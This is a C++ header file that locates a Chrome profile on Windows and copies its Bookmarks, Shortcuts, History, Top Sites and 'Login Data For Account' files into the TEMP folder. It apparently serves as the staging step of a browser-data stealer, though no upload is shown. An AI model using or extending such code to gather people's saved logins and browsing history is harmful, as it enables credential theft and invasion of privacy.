#pragma once

#include <filesystem>
#include <iostream>
#include <cstdlib> 


bool CheckChrome() {
    char* userProfile = nullptr;
    size_t userProfileSize = 0;
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");

    if (userProfile == nullptr) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return false;
    }

    // Construct the path to the Chrome data directory
    std::string chromeDataPath = std::string(userProfile) + R"(\AppData\Local\Google\Chrome\User Data\Default)";
    free(userProfile);
    return std::filesystem::exists(chromeDataPath) && std::filesystem::is_directory(chromeDataPath);
}


bool IsBrowserDataExist() {
    char* userProfile = nullptr;
    size_t userProfileSize = 0;

    // Use _dupenv_s to safely get the USERPROFILE environment variable
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");

    if (userProfile == nullptr) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return false;
    }

    // Construct the path to the Chrome data directory
    std::string chromeDataPath = std::string(userProfile) + R"(\AppData\Local\Google\Chrome\User Data\Default)";
    free(userProfile);

    std::vector<std::string> fileNames = {
        "Bookmarks",
        "Shortcuts",
        "Login Data For Account",
        "History",
        "Top Sites"
    };

    // Check each file in the list
    for (const auto& fileName : fileNames) {
        std::filesystem::path filePath = chromeDataPath + "\\" + fileName;
        if (std::filesystem::exists(filePath)) {
            return true;  // Return true if at least one of the files exist
        }
    }

    return false;
}


void CopyBrowserDataToTemp() {
    if (!IsBrowserDataExist()) {
        std::cout << "No browser data files to copy." << std::endl;
        return;
    }

    char* userProfile = nullptr;
    size_t userProfileSize = 0;
    _dupenv_s(&userProfile, &userProfileSize, "USERPROFILE");
    if (userProfile == nullptr) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return;
    }

    std::string chromeDataPath = std::string(userProfile) + R"(\AppData\Local\Google\Chrome\User Data\Default)";
    free(userProfile);

    // Get the TEMP folder path
    TCHAR tempPathBuffer[MAX_PATH];
    DWORD tempPathLength = GetTempPath(MAX_PATH, tempPathBuffer); 

    if (tempPathLength > MAX_PATH || tempPathLength == 0) {
        std::cerr << "Failed to get TEMP directory path." << std::endl;
        return;
    }

    std::wstring tempPathW(tempPathBuffer);
    std::string tempPath(tempPathW.begin(), tempPathW.end());

    std::vector<std::string> fileNames = {
        "Bookmarks",
        "Shortcuts",
        "Login Data For Account",
        "History",
        "Top Sites"
    };

    for (const auto& fileName : fileNames) {
        std::filesystem::path srcPath = chromeDataPath + "\\" + fileName;
        if (std::filesystem::exists(srcPath)) {
            std::filesystem::path destPath = tempPath + "\\" + fileName;
            try {
                std::filesystem::copy_file(srcPath, destPath, std::filesystem::copy_options::overwrite_existing);
                std::cout << "Copied: " << srcPath << " to " << destPath << std::endl;
            }
            catch (std::filesystem::filesystem_error& e) {
                std::cerr << "Error copying file: " << e.what() << std::endl;
            }
        }
    }
}

